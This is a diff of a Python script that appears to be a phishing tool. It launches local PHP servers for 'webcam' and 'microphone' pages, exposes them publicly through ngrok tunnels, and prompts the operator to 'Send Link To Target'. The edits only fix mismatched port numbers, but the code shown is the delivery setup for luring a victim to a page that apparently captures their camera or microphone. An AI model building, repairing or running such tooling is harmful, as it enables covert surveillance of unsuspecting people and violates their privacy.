@@ -159,13 +159,13 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     def deafult_server():
         with open("logs/deaf_log","w") as deafult:
-            Popen(('php','-S','localhost:2424','-t','webcam'),stdout=deafult,stderr=deafult)
+            Popen(('php','-S','localhost:7777','-t','webcam'),stdout=deafult,stderr=deafult)
     
     deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(4545,"http",auth_token=token)
+    a = ngrok.connect(7777,"http",auth_token=token)
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
@@ -382,13 +382,13 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     def deafult_server():
         with open("logs/deaf_log","w") as deafult:
-            Popen(('php','-S','localhost:2424','-t','webcam'),stdout=deafult,stderr=deafult)
+            Popen(('php','-S','localhost:5454','-t','webcam'),stdout=deafult,stderr=deafult)
     
     deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(4545,"http",auth_token=token)
+    a = ngrok.connect(5454,"http",auth_token=token)
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
@@ -773,7 +773,7 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     def deafult_server():
         with open("logs/deaf_log","w") as deafult:
-            Popen(('php','-S','localhost:5252','-t','webcam'),stdout=deafult,stderr=deafult)
+            Popen(('php','-S','localhost:4545','-t','webcam'),stdout=deafult,stderr=deafult)
     
     deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
@@ -851,13 +851,13 @@ def micro():
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     def deafult_server():
         with open("logs/deaf_log","w") as deafult:
-            Popen(('php','-S','localhost:4545','-t','microphone'),stdout=deafult,stderr=deafult)
+            Popen(('php','-S','localhost:6565','-t','microphone'),stdout=deafult,stderr=deafult)
     
     deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(4545,"http",auth_token=token)
+    a = ngrok.connect(6565,"http",auth_token=token)
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
